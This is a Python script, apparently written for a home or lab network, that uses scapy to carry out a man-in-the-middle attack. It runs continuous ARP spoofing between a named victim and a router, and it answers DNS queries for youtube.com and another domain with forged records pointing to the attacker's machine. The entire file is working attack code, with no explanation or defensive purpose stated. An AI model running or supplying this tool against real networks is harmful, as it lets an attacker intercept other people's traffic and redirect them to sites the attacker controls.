from scapy.all import *
from scapy.layers.dhcp import DHCP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import ARP
import threading

# Target IP and MAC addresses
victim_ip = "192.168.56.13"
victim_mac = "B4:45:06:AE:38:68"
router_ip = "192.168.56.1"
router_mac = "00:C8:8B:6D:F8:42"
attacker_ip = "192.168.56.12"  # IP of the attacker's machine
attacker_mac = "B4:45:06:AE:38:58"

# Interface to use for the attack
interface = "eth0"

# Malicious DNS records
malicious_dns_records = {
    "poop.com.": "192.168.56.12", 
    "youtube.com.": "192.168.56.12"
}

# Function to perform ARP spoofing
def arp_spoof():
    while True:
        # Send spoofed ARP responses to the victim and router
        send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac), iface=interface, verbose=False)
        send(ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac), iface=interface, verbose=False)
        time.sleep(2)

# Function to handle DNS queries
def dns_responder(packet):
    if packet.haslayer(Ether) and packet[Ether].src != attacker_mac:
        if packet.haslayer(DNS) and packet[DNS].qr == 0:  # DNS query
            queried_domain = packet[DNSQR].qname.decode()
            print(queried_domain)
            if queried_domain in malicious_dns_records:
                # Create a DNS response
                print(queried_domain, "DNS Response Sent!")
                response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                           UDP(dport=packet[UDP].sport, sport=53) / \
                           DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                               an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=malicious_dns_records[queried_domain]))
                # Send the DNS response
                send(response, iface=interface, verbose=False)
            else:
                # Forward DNS queries not in the malicious records
                send(packet, iface=interface, verbose=False)
        else:
            send(packet, iface=interface, verbose=False)

def main():
    # Start ARP spoofing in a separate thread
    arp_thread = threading.Thread(target=arp_spoof)
    arp_thread.start()

    # Sniff DHCP packets and apply interception, and also handle DNS responses
    sniff(prn=dns_responder, iface=interface)
    
if __name__ == "__main__":
    main()
